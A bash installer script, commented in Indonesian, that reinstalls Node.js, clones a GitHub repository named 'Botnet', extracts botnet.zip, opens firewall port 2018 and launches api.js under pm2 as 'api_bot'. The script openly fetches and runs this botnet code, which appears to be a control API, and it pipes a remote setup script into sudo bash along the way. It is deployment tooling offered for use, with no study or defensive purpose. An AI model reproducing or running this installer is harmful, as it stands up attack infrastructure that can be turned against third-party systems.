#!/bin/bash

# --- CONFIGURATION & COLORS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- UTILITIES ---
print_status() { echo -e "${YELLOW}[*] $1...${NC}"; }
print_success() { echo -e "${GREEN}[SUCCESS] $1${NC}"; }
print_error() { echo -e "${RED}[ERROR] $1${NC}"; }

show_spinner() {
    local pid=$!
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# --- LOGO ---
clear
echo -e "${CYAN}"
echo "    ___           __  "
echo "   /   |  __  __ / /_  ____"
echo "  / /| | / / / // __/ / __ \\"
echo " / ___ |/ /_/ // /_  / /_/ /"
echo "/_/  |_|\__,_/ \__/  \____/ "
echo -e "${NC}"
echo -e "${BLUE}=== Auto Installer & Log Monitor ===${NC}"
echo "----------------------------------------"
sleep 2

# --- STEP 1: CLEAN & INSTALL NODEJS (PRIORITY) ---
# Sesuai request: Command sudo/hapus nodejs ditaruh di paling awal
print_status "Membersihkan Environment & Install Node.js Baru"
(
    sudo apt-get remove nodejs npm -y
    sudo apt-get autoremove -y
    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
    sudo apt-get install -y nodejs
) > /dev/null 2>&1 &
show_spinner
print_success "Node.js Environment siap."

# --- STEP 2: INSTALL TOOLS PENDUKUNG ---
print_status "Menginstall Unzip, Git & Firewall"
(
    sudo apt-get update -y
    sudo apt-get install -y git unzip ufw
) > /dev/null 2>&1 &
show_spinner
print_success "Tools terinstall."

# --- STEP 3: DOWNLOAD & SETUP PROJECT ---
print_status "Download Repository"

# Hapus folder lama biar fresh
if [ -d "Botnet" ]; then rm -rf Botnet; fi

# Git Clone
git clone https://github.com/kaliajasih/Botnet.git > /dev/null 2>&1 &
show_spinner

# Masuk folder & Unzip
if [ -d "Botnet" ]; then
    cd Botnet || exit
    if [ -f "botnet.zip" ]; then
        print_status "Mengekstrak file zip"
        unzip -o botnet.zip > /dev/null 2>&1
    fi
else
    print_error "Gagal clone repository!"
    exit 1
fi

# --- STEP 4: INSTALL MODULES & FIREWALL ---
print_status "Install Modules (npm install)"
(
    npm install
    npm i -g pm2
    sudo ufw allow 2018
    sudo ufw reload
) > /dev/null 2>&1 &
show_spinner
print_success "Modules & Firewall siap."

# --- STEP 5: START BOT ---
print_status "Menjalankan Bot dengan PM2"

# Stop bot lama jika ada (biar tidak bentrok)
pm2 delete api_bot 2>/dev/null 

# Start bot baru
pm2 start api.js --name "api_bot" > /dev/null 2>&1
pm2 save > /dev/null 2>&1
sleep 3 # Beri waktu sebentar agar bot sempat booting sebelum log muncul

print_success "Bot BERHASIL dijalankan!"
echo "----------------------------------------"
echo -e "${YELLOW}Membuka Log sekarang...${NC}"
echo -e "${CYAN}(Tekan CTRL + C untuk keluar dari tampilan log, Bot akan tetap jalan)${NC}"
echo "----------------------------------------"
sleep 2

# --- STEP 6: AUTO SHOW LOGS ---
# Ini perintah kuncinya: Menampilkan log secara realtime
pm2 logs api_bot
